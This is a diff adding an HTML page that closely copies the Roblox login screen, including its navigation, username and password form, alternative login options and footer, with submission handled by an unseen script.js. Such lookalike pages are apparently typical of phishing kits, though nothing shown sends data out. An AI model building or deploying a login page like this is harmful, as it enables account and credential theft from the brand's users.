@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation Header -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-left">
+                <div class="roblox-logo">
+                    <img src="roblox_icon.png" alt="Roblox" width="28" height="28">
+                </div>
+                <div class="nav-links">
+                    <a href="#" class="nav-link">Charts</a>
+                    <a href="#" class="nav-link">Marketplace</a>
+                    <a href="#" class="nav-link">Create</a>
+                    <a href="#" class="nav-link">Robux</a>
+                </div>
+            </div>
+            <div class="nav-right">
+                <div class="search-container">
+                    <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <path d="m21 21-4.35-4.35"></path>
+                    </svg>
+                    <input type="text" placeholder="Search" class="search-input">
+                </div>
+                <button class="signup-btn">Sign Up</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="login-container">
+            <div class="login-card">
+                <h1 class="login-title">Login to Roblox</h1>
+                
+                <form class="login-form" id="loginForm">
+                    <div class="input-group">
+                        <input 
+                            type="text" 
+                            id="username" 
+                            name="username" 
+                            placeholder="Username/Email/Phone" 
+                            class="login-input"
+                            required
+                        >
+                    </div>
+                    
+                    <div class="input-group">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            placeholder="Password" 
+                            class="login-input"
+                            required
+                        >
+                    </div>
+                    
+                    <button type="submit" class="login-btn" id="loginBtn">
+                        <span class="btn-text">Log In</span>
+                        <div class="loading-spinner" style="display: none;">
+                            <div class="spinner"></div>
+                        </div>
+                    </button>
+                </form>
+
+                <div class="forgot-password">
+                    <a href="#" class="forgot-link">Forgot Password or Username?</a>
+                </div>
+
+                <div class="additional-options">
+                    <button class="option-btn">Email Me a One-Time Code</button>
+                    <button class="option-btn">Log In With Passkey</button>
+                    <button class="option-btn">Use Another Device</button>
+                </div>
+
+                <div class="signup-link">
+                    <span>Don't have an account?</span>
+                    <a href="#" class="signup-text">Sign Up</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">About Us</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Parents</a>
+            <a href="#" class="footer-link">Gift Cards</a>
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Accessibility</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">
+                Your Privacy Choices
+                <svg width="12" height="12" viewBox="0 0 12 12" fill="currentColor">
+                    <circle cx="6" cy="6" r="6"/>
+                </svg>
+            </a>
+        </div>
+    </footer>
+
+    <!-- Error Message -->
+    <div id="errorMessage" class="error-message" style="display: none;">
+        <div class="error-content">
+            <span class="error-text"></span>
+            <button class="error-close" onclick="closeError()">×</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
